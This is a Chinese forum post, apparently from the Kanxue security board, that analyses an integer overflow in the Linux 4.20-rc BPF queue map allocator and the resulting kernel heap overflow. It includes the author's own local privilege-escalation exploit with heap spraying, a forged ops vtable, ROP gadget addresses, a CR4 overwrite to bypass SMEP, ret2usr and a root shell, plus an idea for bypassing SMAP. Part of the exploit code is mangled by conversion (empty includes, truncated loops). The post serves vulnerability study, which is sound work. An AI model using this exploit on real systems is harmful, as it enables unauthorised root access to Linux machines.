> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-266200.htm)

写在前面：

 

本篇文章带来一个 Linux 内核的模块的整数溢出，非常适合 CTF 选手与实战接轨，考察点较为全面，也有可以深挖的地方～

Linux 内核 [BPF 模块整数溢出] 漏洞分析
==========================

本漏洞不涉及正式发行版，主要涉及 Linux Kernel 4.20rc1-4.20rc4，我们使用`Linux 4.20-rc3` 进行分析。

 

首先在：https://gitlab.freedesktop.org/seanpaul/kernel/-/tags

 

下载对应 rc 版本源代码。编译。

内核 BPF 模块
---------

BPF 全称 _Berkeley Packet Filter_，主要涉及包过滤这一部分，分析网络流量。他在数据链路层上提供了接口。BPF 支持包过滤，允许用户态进程提供一个过滤程序，此程序指定了我们想要接收到那种包。比如当我们使用 `tcpdump`时可能只想收到 tcp 连接初始化的包等。BPF 只返回进程提供的能通过过滤器的包。

 

这种机制避免了拷贝一些不需要的包从内核态到进程，极大的提升了性能。

 

_For example, a [tcpdump](https://en.wikipedia.org/wiki/Tcpdump) process may want to receive only packets that initiate a TCP connection. BPF returns only packets that pass the filter that the process supplies. This avoids copying unwanted packets from the [operating system](https://en.wikipedia.org/wiki/Operating_system) [kernel](https://en.wikipedia.org/wiki/Kernel_(computer_science)) to the process, greatly improving performance._

 

常见的一些抓包工具的实现都与其有关。

 

值得一提的是，BPF 模块也可以基于此对用户态的一些程序进行一些 tracing 或者访问控制之类的。

 

比如 PWN 手熟悉的 seccomp 沙箱，在设计时也借用了其思想，不同的是当 seccomp 使用时与 BPF 做 packet 过滤不同的是，过滤操作当前的 user_regs_struct 数据结构，需要我们预先定义好的一套 syscall 的过滤规则，以及对应的表示。

 

更加具体的，可以看一下：

 

[Linux Socket Filtering aka Berkeley Packet Filter (BPF)](https://www.kernel.org/doc/html/latest/networking/filter.html#networking-filter)

 

[Seccomp BPF (SECure COMPuting with filters)](https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html)

 

[LINUX 系统安全_SANDBOX_SECCOMP-BPF](http://www.selinuxplus.com/?p=370)

漏洞原理与触发
-------

### 整数溢出追踪

源码位置：https://elixir.bootlin.com/linux/v4.20-rc3/source/kernel/bpf/syscall.c#L2466

 

我们想调用 BPF 功能：

```
#include int bpf(int cmd, union bpf_attr *attr, unsigned int size); 
```

追踪到其系统调用：

```
SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size)
{
    union bpf_attr attr = {};
    int err;
 
    if (sysctl_unprivileged_bpf_disabled && !capable(CAP_SYS_ADMIN))
        return -EPERM;
 
    err = bpf_check_uarg_tail_zero(uattr, sizeof(attr), size);
    if (err)
        return err;
    size = min_t(u32, size, sizeof(attr));
 
    /* copy attributes from user space, may be less than sizeof(bpf_attr) */
    if (copy_from_user(&attr, uattr, size) != 0)
        return -EFAULT;
 
    err = security_bpf(cmd, &attr, size);
    if (err < 0)
        return err;
 
    switch (cmd) {
    case BPF_MAP_CREATE:
        err = map_create(&attr);
        break;
    case BPF_MAP_LOOKUP_ELEM:
        err = map_lookup_elem(&attr);
        break;
    case BPF_MAP_UPDATE_ELEM:
        err = map_update_elem(&attr);
        break;
    case BPF_MAP_DELETE_ELEM:
        err = map_delete_elem(&attr);
        break;
    case BPF_MAP_GET_NEXT_KEY:
        err = map_get_next_key(&attr);
        break;
    case BPF_PROG_LOAD:
        err = bpf_prog_load(&attr);
        break;
    case BPF_OBJ_PIN:
        err = bpf_obj_pin(&attr);
        break;
    case BPF_OBJ_GET:
        err = bpf_obj_get(&attr);
        break;
    case BPF_PROG_ATTACH:
        err = bpf_prog_attach(&attr);
        break;
    case BPF_PROG_DETACH:
        err = bpf_prog_detach(&attr);
        break;
    case BPF_PROG_QUERY:
        err = bpf_prog_query(&attr, uattr);
        break;
    case BPF_PROG_TEST_RUN:
        err = bpf_prog_test_run(&attr, uattr);
        break;
    case BPF_PROG_GET_NEXT_ID:
        err = bpf_obj_get_next_id(&attr, uattr,
                      &prog_idr, &prog_idr_lock);
        break;
    case BPF_MAP_GET_NEXT_ID:
        err = bpf_obj_get_next_id(&attr, uattr,
                      &map_idr, &map_idr_lock);
        break;
    case BPF_PROG_GET_FD_BY_ID:
        err = bpf_prog_get_fd_by_id(&attr);
        break;
    case BPF_MAP_GET_FD_BY_ID:
        err = bpf_map_get_fd_by_id(&attr);
        break;
    case BPF_OBJ_GET_INFO_BY_FD:
        err = bpf_obj_get_info_by_fd(&attr, uattr);
        break;
    case BPF_RAW_TRACEPOINT_OPEN:
        err = bpf_raw_tracepoint_open(&attr);
        break;
    case BPF_BTF_LOAD:
        err = bpf_btf_load(&attr);
        break;
    case BPF_BTF_GET_FD_BY_ID:
        err = bpf_btf_get_fd_by_id(&attr);
        break;
    case BPF_TASK_FD_QUERY:
        err = bpf_task_fd_query(&attr, uattr);
        break;
    case BPF_MAP_LOOKUP_AND_DELETE_ELEM:
        err = map_lookup_and_delete_elem(&attr);
        break;
    default:
        err = -EINVAL;
        break;
    }
 
    return err;
}

```

主要的，我们首先关心

```
union bpf_attr attr = {};
......
case BPF_MAP_CREATE:
        err = map_create(&attr);
        break;

```

当 `cmd` 为 `BPF_MAP_CREATE` 时，首先调用 `map_create(&attr)` 来创建 map。

 

接下来看一下 `map_create(&attr)` 的源码。

```
static int map_create(union bpf_attr *attr)
{
    int numa_node = bpf_map_attr_numa_node(attr);
    struct bpf_map *map;
    int f_flags;
    int err;
 
    err = CHECK_ATTR(BPF_MAP_CREATE);
    if (err)
        return -EINVAL;
 
    f_flags = bpf_get_file_flag(attr->map_flags);
    if (f_flags < 0)
        return f_flags;
 
    ......
 
    /* find map type and init map: hashtable vs rbtree vs bloom vs ... */
    map = find_and_alloc_map(attr);
    if (IS_ERR(map))
        return PTR_ERR(map);
  ......
}

```

可以看到调用了 `find_and_alloc_map` 来分配空间。

```
static struct bpf_map *find_and_alloc_map(union bpf_attr *attr)
{
    const struct bpf_map_ops *ops;
    u32 type = attr->map_type;
    struct bpf_map *map;
    int err;
 
    if (type >= ARRAY_SIZE(bpf_map_types))   
        return ERR_PTR(-EINVAL);
    type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));
    ops = bpf_map_types[type];
    if (!ops)
        return ERR_PTR(-EINVAL);
 
    if (ops->map_alloc_check) {
        err = ops->map_alloc_check(attr);
        if (err)
            return ERR_PTR(err);
    }
    if (attr->map_ifindex)
        ops = &bpf_map_offload_ops;
    map = ops->map_alloc(attr);
    if (IS_ERR(map))
        return map;
    map->ops = ops;
    map->map_type = type;
    return map;
}

```

首先取了 bpf_attr 结构体中的 map_type 字段。赋值到 u32 的 type。

```
__u32    map_type;    /* one of enum bpf_map_type */

```

而 `bpf_map_types` 是一个数组，在 linux/bpf_types.h 中储存了合法的 `BPF_MAP_TYPE`

 

如：`BPF_MAP_TYPE(BPF_MAP_TYPE_CGROUP_STORAGE, cgroup_storage_map_ops)`

```
static const struct bpf_map_ops * const bpf_map_types[] = {
#define BPF_PROG_TYPE(_id, _ops)
#define BPF_MAP_TYPE(_id, _ops) \
    [_id] = &_ops,
#include #undef BPF_PROG_TYPE
#undef BPF_MAP_TYPE
}; 
```

ARRAY_SIZE 是获取数组中的元素个数。`__must_be_array(arr)` 要求其必须被用在数组上。

 

这个宏在驱动编程时常常用来获取设备结构体中设备的个数。

```
/**
 * ARRAY_SIZE - get the number of elements in array @arr
 * @arr: array to be sized
 */
#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]) + __must_be_array(arr))

```

所以此函数在开始阶段判断了 type 的合法性。若不合法 return err。

 

接下来通过我们当前的 type 计算了一个数组下标，作为访问数组 `bpf_map_types` 的下标，找到对应的 bpf_map_type，然后获取对应的函数虚表为 ops。

 

接下来有一个对于虚表中函数的调用：`ops->map_alloc(attr)`

```
if (attr->map_ifindex)
        ops = &bpf_map_offload_ops;
map = ops->map_alloc(attr);
    if (IS_ERR(map))
        return map;
    map->ops = ops;
    map->map_type = type;
    return map;

```

注意，此时的 map_alloc 是一个虚表（bpf_map_ops）中的函数。

 

到此为止，一切正常，我们回过来看这个虚表 ops。

 

虚表 ops，类型为 `const struct bpf_map_ops`

 

初始化于：`ops = bpf_map_types[type];`

 

而数组中的每一项是以如下的一一对应的关系存在：

 

`[_id] = &_ops,`

 

![](https://bbs.pediy.com/upload/attach/202102/876323_A6E9BEH28GXVXAR.jpg)

 

数组中的每一项都由宏 `BPF_MAP_TYPE` 封装起来，对应 id 与 ops

```
#define BPF_MAP_TYPE(_id, _ops)

```

此时我们关注最下面的：

```
BPF_MAP_TYPE(BPF_MAP_TYPE_QUEUE, queue_map_ops)    //BPF_MAP_TYPE_QUEUE为 22 (0x16)

```

queue_map_ops 为：

```
const struct bpf_map_ops queue_map_ops = {
    .map_alloc_check = queue_stack_map_alloc_check,   
    .map_alloc = queue_stack_map_alloc,                            //关键函数
    .map_free = queue_stack_map_free,
    .map_lookup_elem = queue_stack_map_lookup_elem,
    .map_update_elem = queue_stack_map_update_elem,
    .map_delete_elem = queue_stack_map_delete_elem,
    .map_push_elem = queue_stack_map_push_elem,
    .map_pop_elem = queue_map_pop_elem,
    .map_peek_elem = queue_map_peek_elem,
    .map_get_next_key = queue_stack_map_get_next_key,
};

```

当我们将 `attr->map_type` 初始化为 22 时，对应着 BPF_MAP_TYPE_QUEUE，此时会使用虚表 `queue_map_ops`

 

而这张虚表中的 `.map_alloc = queue_stack_map_alloc` 函数中，**即存在我们的整数溢出。**

 

ps：网上的分析在这里讲的很模糊，直接一下就到了对于 `queue_stack_map_alloc` 的分析，我这里尽量讲详细一些，实际上如果你不调整 map type 是到达不了此处的。

 

总结一下想要到达漏洞函数的条件：

*   设置 attr->map_type 为 22
    
*   通过 map_alloc_check 的检查。
    
    *   此时是：
        
        ```
        /* Called from syscall */
        static int queue_stack_map_alloc_check(union bpf_attr *attr)
        {
          /* check sanity of attributes */
          if (attr->max_entries == 0 || attr->key_size != 0 ||
              attr->map_flags & ~QUEUE_STACK_CREATE_FLAG_MASK)
              return -EINVAL;
         
          if (attr->value_size > KMALLOC_MAX_SIZE)
              /* if value_size is bigger, the user space won't be able to
               * access the elements.
               */
              return -E2BIG;
         
          return 0;    //要到达这里
        }
        
        ```
        
*   attr->map_ifindex 为空。
    

比如我们按照如下设置：

```
union bpf_attr *attr;
attr->map_type = BPF_MAP_TYPE_QUEUE;    //BPF_MAP_TYPE_QUEUE
attr->max_entries = -1;
attr->map_flags = 0;
attr->value_size = 0x20;
int ret = syscall(__NR_bpf,0,attr,0x30);

```

就可以正常到达 `queue_stack_map_alloc`

### queue_stack_map_alloc

```
static struct bpf_map *queue_stack_map_alloc(union bpf_attr *attr)
{
    int ret, numa_node = bpf_map_attr_numa_node(attr);
    struct bpf_queue_stack *qs;
    u32 size, value_size;
    u64 queue_size, cost;
 
    size = attr->max_entries + 1;
    value_size = attr->value_size;
 
    queue_size = sizeof(*qs) + (u64) value_size * size;
 
    cost = queue_size;
    if (cost >= U32_MAX - PAGE_SIZE)
        return ERR_PTR(-E2BIG);
 
    cost = round_up(cost, PAGE_SIZE) >> PAGE_SHIFT;
 
    ret = bpf_map_precharge_memlock(cost);
    if (ret < 0)
        return ERR_PTR(ret);
 
    qs = bpf_map_area_alloc(queue_size, numa_node);
    if (!qs)
        return ERR_PTR(-ENOMEM);
 
    memset(qs, 0, sizeof(*qs));
 
    bpf_map_init_from_attr(&qs->map, attr);
 
    qs->map.pages = cost;
    qs->size = size;
 
    raw_spin_lock_init(&qs->lock);
 
    return &qs->map;
}

```

我们关注到这样一行：

```
u32 size;
size = attr->max_entries + 1;

```

`size` 本身作为一个 unsigned int 32 的类型，如果我们令 `attr->max_entries = -1` ，那么 size 就会产生一个整数溢出。

 

![](https://bbs.pediy.com/upload/attach/202102/876323_SZ8GJ8ADSBWKG66.jpg)

 

**可以看到 size 溢出为 0 了。**

 

更进一步的，他控制了 `bpf_map_area_alloc` 分配的大小：

```
  ......
  struct bpf_queue_stack *qs;   
  u32 size, value_size;
  u64 queue_size, cost;
 
  size = attr->max_entries + 1;
  value_size = attr->value_size;
 
  queue_size = sizeof(*qs) + (u64) value_size * size;
  ......
qs = bpf_map_area_alloc(queue_size, numa_node);
......
bpf_map_init_from_attr(&qs->map, attr);
  ......
qs->size = size;
  return &qs->map;

```

而 `bpf_map_area_alloc`有这样的一个调用：

```
void *bpf_map_area_alloc(size_t size, int numa_node)
{
    ......
  area = kmalloc_node(size, GFP_USER | flags, numa_node);
        if (area != NULL)
            return area;
    ......
}

```

以 size 为参数，通过`kmalloc_node` 分配内核空间为 area。

 

这个 size 在正常情况下应该是：`struct bpf_queue_stac` 的大小加上 `value_size * size` 相当于是 map 中每一项的大小（value_size）乘项数 + 1（attr->max_entries + 1），而溢出导致了这一部分为 0，也就是分配空间时只分配了 struct bpf_queue_stack 的空间而没有分配对应的 map 所需的空间。导致实际分配的内核堆空间过小。

 

bpf_queue_stack 结构体定义如下：

```
struct bpf_queue_stack {
    struct bpf_map map;
    raw_spinlock_t lock;
    u32 head, tail;
    u32 size; /* max_entries + 1 */
 
    char elements[0] __aligned(8);
};

```

关于 bpf map 的实际结构与作用可以看：[BPF 数据传递的桥梁——BPF Map（一）](https://blog.csdn.net/alex_yangchuansheng/article/details/108332511)

 

总之这一步导致了堆空间分配过小，没有给 map 留够空间。

 

接下来调用了 `bpf_map_init_from_attr(&qs->map, attr)` 进行初始化：

```
void bpf_map_init_from_attr(struct bpf_map *map, union bpf_attr *attr)
{
    map->map_type = attr->map_type;
    map->key_size = attr->key_size;
    map->value_size = attr->value_size;
    map->max_entries = attr->max_entries;
    map->map_flags = attr->map_flags;
    map->numa_node = bpf_map_attr_numa_node(attr);
}

```

最后从 `find_and_alloc_map(attr)` 中返回我们的 map（struct bpf_map *）。

### 堆溢出追踪

已知现在我们有了一个 map，此 map 的 value_size、max_entries 均是可以由我们自定义的 attr 结构体控制。

 

并且由于整数溢出，导致只分配了`struct bpf_queue_stack` 的空间，而没有分配 map 对应的空间。（个人理解这个 bpf_queue_stack 类似报文头部，而 map 对应的空间类似 payload）。

 

在分配结束后，返回了的 map 对象的地址就是我们通过 kmalloc 申请出的内核堆的位置。而这个申请的大小是 0x100.

```
/* find map type and init map: hashtable vs rbtree vs bloom vs ... */
    map = find_and_alloc_map(attr);
    if (IS_ERR(map))
        return PTR_ERR(map);

```

接下来，我们需要找到一块可以造成堆溢出的位置。我们将视角移出 `map_create` 函数。

 

在 bpf 系统调用中的大 switch 里，有这样一个分支：

 

![](https://bbs.pediy.com/upload/attach/202102/876323_ZWE76NQQPREP2TU.jpg)

 

根据名字进行合理猜测，在 `BPF_MAP_CREATE` 分支中我们创建了 map 对象。

 

而在`BPF_MAP_UPDATE_ELEM` 分支中我们对此对象进行更新等操作。

 

这个函数被我简化后如下：

```
static int map_update_elem(union bpf_attr *attr)
{
    void __user *ukey = u64_to_user_ptr(attr->key);
    void __user *uvalue = u64_to_user_ptr(attr->value);
    int ufd = attr->map_fd;
    struct bpf_map *map;
    void *key, *value;
    u32 value_size;
    struct fd f;
    int err;
  ......
    f = fdget(ufd);
    map = __bpf_map_get(f);
    if (IS_ERR(map))
        return PTR_ERR(map);
    ......
    value_size = map->value_size;
    value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);    //kmalloc申请一块堆空间
    if (!value)
        goto free_key;
    err = -EFAULT;
    if (copy_from_user(value, uvalue, value_size) != 0)    //将用户的uvalue拷贝value_size字节到申请出的value上。
        goto free_value;
    ......
    else if (map->map_type == BPF_MAP_TYPE_QUEUE ||
           map->map_type == BPF_MAP_TYPE_STACK) {
        err = map->ops->map_push_elem(map, value, attr->flags);//将value的内容放入map
    ......
}

```

在最后的时候调用虚表中的 `map_push_elem` 将 value 中的内容放入 map。

 

他对应的虚表函数是`queue_stack_map_push_elem`

```
/* Called from syscall or from eBPF program */
static int queue_stack_map_push_elem(struct bpf_map *map, void *value,
                     u64 flags)
{
    struct bpf_queue_stack *qs = bpf_queue_stack(map);
    unsigned long irq_flags;
    int err = 0;
    void *dst;
 
    /* BPF_EXIST is used to force making room for a new element in case the
     * map is full
     */
    bool replace = (flags & BPF_EXIST);
 
    /* Check supported flags for queue and stack maps */
    if (flags & BPF_NOEXIST || flags > BPF_EXIST)
        return -EINVAL;
 
    raw_spin_lock_irqsave(&qs->lock, irq_flags);
 
    if (queue_stack_map_is_full(qs)) {
        if (!replace) {
            err = -E2BIG;
            goto out;
        }
        /* advance tail pointer to overwrite oldest element */
        if (unlikely(++qs->tail >= qs->size))
            qs->tail = 0;
    }
 
    dst = &qs->elements[qs->head * qs->map.value_size]; //qs->head代表当前是第几个entry
    memcpy(dst, value, qs->map.value_size);                            //堆溢出位置。
 
    if (unlikely(++qs->head >= qs->size))
        qs->head = 0;
 
out:
    raw_spin_unlock_irqrestore(&qs->lock, irq_flags);
    return err;
}

```

想要理解这个堆溢出，最好通过一个简图来说明。

 

这是 bpf_queue_stack、bpf_map 对应的结构。

```
struct bpf_queue_stack {
    struct bpf_map map;
    raw_spinlock_t lock;
    u32 head, tail;
    u32 size; /* max_entries + 1 */
 
    char elements[0] __aligned(8);
};
 
 
struct bpf_map {
    /* The first two cachelines with read-mostly members of which some
     * are also accessed in fast-path (e.g. ops, max_entries).
     */
    const struct bpf_map_ops *ops ____cacheline_aligned;
    struct bpf_map *inner_map_meta;
#ifdef CONFIG_SECURITY
    void *security;
#endif
    enum bpf_map_type map_type;
    u32 key_size;
    u32 value_size;
    u32 max_entries;
    u32 map_flags;
    u32 pages;
    u32 id;
    int numa_node;
    u32 btf_key_type_id;
    u32 btf_value_type_id;
    struct btf *btf;
    bool unpriv_array;
    /* 55 bytes hole */
 
    /* The 3rd and 4th cacheline with misc members to avoid false sharing
     * particularly with refcounting.
     */
    struct user_struct *user ____cacheline_aligned;
    atomic_t refcnt;
    atomic_t usercnt;
    struct work_struct work;
    char name[BPF_OBJ_NAME_LEN];
};

```

![](https://bbs.pediy.com/upload/attach/202102/876323_KA3VCFMWU7MA8WF.jpg)

 

我们在整数溢出时，只分配了 map header 的空间，而没有正常的分配 map payload 的空间。

```
dst = &qs->elements[qs->head * qs->map.value_size]; //qs->head代表当前是第几个entry，索引到目标entry
memcpy(dst, value, qs->map.value_size);                            //拷贝数据到entry，堆溢出位置。
 
if (unlikely(++qs->head >= qs->size))
    qs->head = 0;

```

**所以，对于 0x100 大小的 map header+map payload，如果我们要拷贝的大小（value_size）大于（0x100-map header）的大小，就会造成堆溢出**

漏洞利用
----

我们将目光放在整个 map header 的 `struct bpf_map`上。

```
struct bpf_map {
    /* The first two cachelines with read-mostly members of which some
     * are also accessed in fast-path (e.g. ops, max_entries).
     */
    const struct bpf_map_ops *ops ____cacheline_aligned;
  ......

```

可以看到其第一个成员就是虚表指针 `ops` ，换句话说，在我们 kamlloc 出的 slab 中的第一个位置就是指向当前 map 虚表的指针，如果我们能通过上方的 slab 堆溢出，劫持下方 slab 的虚表指针，再 fake 相应的 vtable，就可以实现一套内核的执行流劫持。

 

经过我们测试

 

![](https://bbs.pediy.com/upload/attach/202102/876323_D23NE2S4C2SSXHG.jpg)

 

一开始对 map 的不完全分配的 slab 地址是 `0xffff8880059fb300` ，然后我们 memcpy 的时候是向 `0xffff8880059fb3d0` 拷贝，也就是 map payload 是从偏移 0xd0 放置的。差值为 0x100-0xd0 = 0x30，**也就是只要我们拷贝大于 0x30 的数据，就可以实现溢出**，而我们每 update 一次，拷贝的大小是最初的 `attr->value_size` 。

 

最终的攻击点我们选择在在 fake vtable 上伪造 fake map_release 函数指针，通过 close 对应的 map id 触发 fake map_releas 完成执行流劫持。

exp 编写
------

首先给出我自己写的 exp

```
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
 
#ifndef BPF_MAP_TYPE_QUEUE
#define BPF_MAP_TYPE_QUEUE 22
#endif
 
#ifndef BPF_MAP_TYPE_STACK
#define BPF_MAP_TYPE_STACK 23
#endif
 
#define N 14
 
//#define DEBUG
 
#define EVIL_CR4 0x6f0 
 
#define COMMIT_CREDS 0xffffffff810bd9c0
#define PREPARE_KERNEL_CRED 0xffffffff810bdc70
#define NATIVE_WRITE_CR4 0xffffffff81072820
#define POP_RAX_RET 0xffffffff81039ee1
#define POP_RDI_RET 0xffffffff810890a0
#define SWAPGS 0xffffffff810728c4
#define IRETQ
#define SYSRET 0xffffffff81c00163
#define IRETQ 0xFFFFFFFF8103713B
#define XCHG_EAX_ESP 0xffffffff810534d0
#define EVIL_RSP 0x810534d0
 
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
 
uint64_t value[7];
union bpf_attr *attr;
union bpf_attr *attr2;
unsigned int spray_map_fd[15];
 
 
 
 __attribute__((constructor)) static void Init ( void )
{
    attr = malloc(0x100);
    attr2 = malloc(0x100);
}
 
size_t user_cs, user_ss, user_rflags, user_sp;  //保存用户态寄存器状态
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
}
 
 
void kernel_heap_spray()
{
    int i=0;
    for(i;imap_type = 0x16;    //BPF_MAP_TYPE_QUEUE 0x16
    attr->max_entries = -1;
    attr->map_flags = 0;
    attr->value_size = 0x40;
    //attr->key = 0;
    ret = syscall(__NR_bpf,BPF_MAP_CREATE,attr,0x30);
    if(ret == -1)
    {
        perror("bpf failed");
        exit(0);
    }   //0x40eda5
    printf("map fd:%d\n",ret);
 
    kernel_heap_spray();     
    set_up_rop();
 
 
 
    #ifdef DEBUG
    for(int i=0;imap_fd = ret;
    attr2->value = value;
    attr2->value_size = 0x40;
    attr2->key = 0;
    attr2->flags = 2;
    syscall(__NR_bpf,BPF_MAP_UPDATE_ELEM,attr2,0x30);
 
    for(int i=0;i
```

效果：  
![](https://bbs.pediy.com/upload/attach/202102/876323_WHQBW8Y4CKH439V.jpg)  
个人觉得我写的这个比网上的 exp 要略微优雅一些（bypass smep）

 

几个关键点：

*   作为 union 的 attr 成员不要直接做赋值，分配的空间上很可能会爆段错误，所以我选择写成一个 constructor 提前分配固定的空间，这样就不会在赋值的时候出错。（这个当时踩了一下坑）
*   main 函数结束以后，exit_group 在销毁当前进程的时候会对所有申请出来的 map 做回收，也会调用 map_release，但这个是不能用的，因为当我们 mmap 出一段空间放置 fake vtable（fake ops），这段空间会在 exit 的时候提前于 map_release 被回收，导致出现访问错误。（这里踩了好一会儿的坑）
*   整个攻击流程是一个 only bypass smep 的想法，rop 劫持 cr4 然后 ret2usr 提升权限，最后 `swapgs; iretq` 着陆用户态起 shell，成功率可以说百分百。

### 一个 bypass smap 的想法

实际上本例我认为还可以做到一个 smap bypass，说一下想法 orz。

 

注意到一开始的时候，我们使用了这样一条在内核中常用的栈迁移 gadgets：`xchg eax esp; ret` 原本的想法是将其直接放到用户态 mmap 出来的 fake ops 上。但是这样是没法 bypass smap 的，因为涉及到向用户态取数据。

 

但是，如果我们借用 ret2dir 的思想，在用户态大量 mmap 喷射内存到 phymaps 上，然后将 spray 出来的空间填上我们的 gadgets，然后在内核态找到 phymaps，那么就可以直接从内核态取数据了（gadgets），这样就实现了一个 smap 的 bypass～

[看雪学院推出的专业资质证书《看雪安卓应用安全能力认证 v1.0》（中级和高级）！](https://bbs.pediy.com/thread-265424.htm)

最后于 14 小时前 被 ScUpax0s 编辑 ，原因：